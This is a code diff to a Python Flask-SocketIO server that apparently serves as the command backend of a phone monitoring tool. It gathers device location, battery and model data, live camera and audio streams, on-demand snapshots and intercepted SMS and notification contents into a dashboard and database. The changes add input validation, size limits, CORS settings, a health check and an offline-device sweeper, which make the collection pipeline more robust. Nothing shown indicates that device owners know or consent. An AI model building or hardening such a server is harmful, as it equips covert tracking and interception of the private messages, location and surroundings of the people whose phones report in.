@@ -4,6 +4,7 @@ import sqlite3
 import time
 import os
 import base64
+import logging
 from datetime import datetime
 from threading import Lock
 
@@ -11,14 +12,24 @@ from threading import Lock
 # Initialize App & Security
 # -----------------------
 app = Flask(__name__)
+app.config["SECRET_KEY"] = os.environ.get("SECRET_KEY", "change-me-in-production")
 thread_lock = Lock()
+
+log_level = os.environ.get("LOG_LEVEL", "INFO").upper()
+app.logger.setLevel(getattr(logging, log_level, logging.INFO))
+
+
+def parse_cors_origins(raw):
+    if not raw or raw.strip() == "*":
+        return "*"
+    return [origin.strip() for origin in raw.split(",") if origin.strip()]
 
 # Professional Buffer: Optimized for high-speed binary data (Live Video/Audio)
 # max_http_buffer_size set to 20MB to handle high-res snapshots without crashing
 socketio = SocketIO(
     app,
     async_mode="gevent",
-    cors_allowed_origins="*",
+    cors_allowed_origins=parse_cors_origins(os.environ.get("CORS_ALLOWED_ORIGINS", "*")),
     ping_timeout=120,
     ping_interval=25,
     max_http_buffer_size=20000000 
@@ -42,12 +53,20 @@ dashboard_sids = set()
 DASHBOARD_BROADCAST_INTERVAL = 1.0
 TRAIL_LOG_INTERVAL_SECONDS = 15
 DASHBOARD_ROOM = "dashboard_viewers"
-STREAM_RELAY_INTERVAL_SECONDS = 0.45
+STREAM_RELAY_INTERVAL_SECONDS = 0.20
+MAX_FRAME_AGE_SECONDS = 1.5
+OFFLINE_DEVICE_TIMEOUT_SECONDS = int(os.environ.get("OFFLINE_DEVICE_TIMEOUT_SECONDS", "60"))
+DEVICE_SWEEP_INTERVAL_SECONDS = int(os.environ.get("DEVICE_SWEEP_INTERVAL_SECONDS", "15"))
+MAX_DEVICE_ID_LENGTH = 128
+MAX_TEXT_FIELD_LENGTH = 256
+MAX_MESSAGE_LENGTH = 2048
+MAX_SNAPSHOT_DATA_URL_LENGTH = 25_000_000
 
 last_dashboard_emit = 0.0
 dashboard_emit_scheduled = False
 APP_START_TS = time.time()
 last_stream_emit_by_device = {}
+sweeper_started = False
 
 metrics = {
     "http_requests_total": 0,
@@ -67,6 +86,54 @@ metrics = {
 def inc_metric(key, amount=1):
     with thread_lock:
         metrics[key] = metrics.get(key, 0) + amount
+
+
+def safe_text(value, max_len=MAX_TEXT_FIELD_LENGTH):
+    if value is None:
+        return ""
+    return str(value).strip()[:max_len]
+
+
+def safe_float(value, min_value=None, max_value=None):
+    try:
+        number = float(value)
+    except (TypeError, ValueError):
+        return None
+
+    if min_value is not None and number < min_value:
+        return None
+    if max_value is not None and number > max_value:
+        return None
+    return number
+
+
+def device_status_sweeper():
+    while True:
+        time.sleep(max(DEVICE_SWEEP_INTERVAL_SECONDS, 1))
+        now = int(time.time())
+        changed = False
+
+        with thread_lock:
+            for _, info in devices.items():
+                if info.get("status") != "online":
+                    continue
+                last_seen = int(info.get("last_seen") or 0)
+                if (now - last_seen) > OFFLINE_DEVICE_TIMEOUT_SECONDS:
+                    info["status"] = "offline"
+                    info["sid"] = None
+                    changed = True
+
+        if changed:
+            emit_dashboard_update(force=True)
+
+
+def ensure_background_tasks():
+    global sweeper_started
+    with thread_lock:
+        if sweeper_started:
+            return
+        sweeper_started = True
+    socketio.start_background_task(device_status_sweeper)
 
 
 @app.before_request
@@ -136,10 +203,19 @@ def emit_dashboard_update(force=False):
 
 @socketio.on("join_dashboard")
 def join_dashboard_view():
+    ensure_background_tasks()
     with thread_lock:
         dashboard_sids.add(request.sid)
     join_room(DASHBOARD_ROOM)
     emit("dashboard_update", serialize_devices())
+
+
+@app.route("/healthz")
+def healthz():
+    return jsonify({
+        "status": "ok",
+        "uptime_seconds": int(max(time.time() - APP_START_TS, 0))
+    })
 
 
 @app.route("/metrics")
@@ -302,7 +378,8 @@ def dashboard():
 # -----------------------
 @socketio.on("register_device")
 def register_device(data):
-    device_id = data.get("device_id")
+    ensure_background_tasks()
+    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
     if not device_id:
         return
 
@@ -333,9 +410,12 @@ def handle_disconnect():
 # -----------------------
 @socketio.on("telemetry")
 def telemetry(data):
-    device_id = data.get("device_id")
+    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
     if not device_id:
         return
+
+    lat = safe_float(data.get("lat"), -90, 90)
+    lon = safe_float(data.get("lon"), -180, 180)
 
     device = devices.setdefault(device_id, {})
     inc_metric("telemetry_events")
@@ -345,11 +425,11 @@ def telemetry(data):
         "device_id": device_id,
         "battery": data.get("battery"),
         "charging": data.get("charging"),
-        "platform": data.get("platform"),
-        "model": data.get("model"),
-        "network": data.get("network"),
-        "lat": data.get("lat"),
-        "lon": data.get("lon"),
+        "platform": safe_text(data.get("platform"), MAX_TEXT_FIELD_LENGTH),
+        "model": safe_text(data.get("model"), MAX_TEXT_FIELD_LENGTH),
+        "network": safe_text(data.get("network"), MAX_TEXT_FIELD_LENGTH),
+        "lat": lat,
+        "lon": lon,
         "last_seen": int(time.time()),
         "status": "online",
         "sid": request.sid
@@ -377,6 +457,7 @@ def telemetry(data):
 # -----------------------
 @socketio.on("request_snapshot")
 def request_snapshot(device_id):
+    device_id = safe_text(device_id, MAX_DEVICE_ID_LENGTH)
     inc_metric("snapshot_requests")
     device = devices.get(device_id)
     if device and device.get("sid"):
@@ -399,6 +480,7 @@ def request_snapshot(device_id):
 @app.route("/ping/<device_id>")
 def ping_device(device_id):
     """HTTP endpoint to trigger a ping event to a specific device."""
+    device_id = safe_text(device_id, MAX_DEVICE_ID_LENGTH)
     device = devices.get(device_id)
     if device and device.get("sid"):
         print(f"[>] Pinging device: {device_id}")
@@ -411,7 +493,9 @@ def ping_device(device_id):
 @socketio.on("pong")
 def handle_pong(data):
     """Receive pong responses from devices."""
-    device_id = data.get("device_id")
+    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
+    if not device_id:
+        return
     print(f"[<] Pong received from {device_id}")
     inc_metric("pongs_received")
     # optionally update last_seen or notify dashboard
@@ -421,12 +505,18 @@ def handle_pong(data):
 
 @socketio.on("snapshot_data")
 def snapshot_data(data):
-    device_id = data.get("device_id") or get_device_id_by_sid(request.sid) or "unknown"
+    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH) or get_device_id_by_sid(request.sid) or "unknown"
     image_data = data.get("image")
     inc_metric("snapshot_received")
 
     if not image_data or "," not in image_data:
         print(f"Snapshot Processing Error: Invalid image payload from {device_id}")
+        return
+    if not image_data.startswith("data:image/"):
+        print(f"Snapshot Processing Error: Invalid image mime from {device_id}")
+        return
+    if len(image_data) > MAX_SNAPSHOT_DATA_URL_LENGTH:
+        print(f"Snapshot Processing Error: Snapshot payload too large from {device_id}")
         return
 
     try:
@@ -454,6 +544,12 @@ def handle_stream(data):
     data.setdefault("device_id", get_device_id_by_sid(request.sid))
     if not data.get("device_id") or not data.get("frame"):
         return
+
+    frame_timestamp = data.get("ts")
+    if isinstance(frame_timestamp, (int, float)):
+        frame_age_seconds = (time.time() * 1000 - frame_timestamp) / 1000
+        if frame_age_seconds > MAX_FRAME_AGE_SECONDS:
+            return
 
     device_id = data.get("device_id")
     now = time.time()
@@ -484,7 +580,12 @@ def handle_audio(chunk):
 # -----------------------
 @socketio.on("incoming_notification")
 def handle_notification(data):
-    device_id = data.get("device_id")
+    device_id = safe_text(data.get("device_id"), MAX_DEVICE_ID_LENGTH)
+    if not device_id:
+        return
+
+    title = safe_text(data.get("title"), MAX_TEXT_FIELD_LENGTH)
+    body = safe_text(data.get("body"), MAX_MESSAGE_LENGTH)
     inc_metric("notifications")
     
     # Save to Database Logs
@@ -493,13 +594,18 @@ def handle_notification(data):
     c.execute("""
     INSERT INTO logs (device_id, type, sender, message, timestamp)
     VALUES (?, ?, ?, ?, ?)
-    """, (device_id, "SMS/Notification", data.get("title"), data.get("body"), int(time.time())))
+    """, (device_id, "SMS/Notification", title, body, int(time.time())))
     conn.commit()
     conn.close()
 
     print(f"[!] New SMS/Notification from {device_id}")
     # Instant push alert for the dashboard
-    socketio.emit("new_notification_alert", data, room=DASHBOARD_ROOM)
+    socketio.emit("new_notification_alert", {
+        "device_id": device_id,
+        "title": title,
+        "body": body,
+        "timestamp": int(time.time())
+    }, room=DASHBOARD_ROOM)
 
 # -----------------------
 # Server Execution
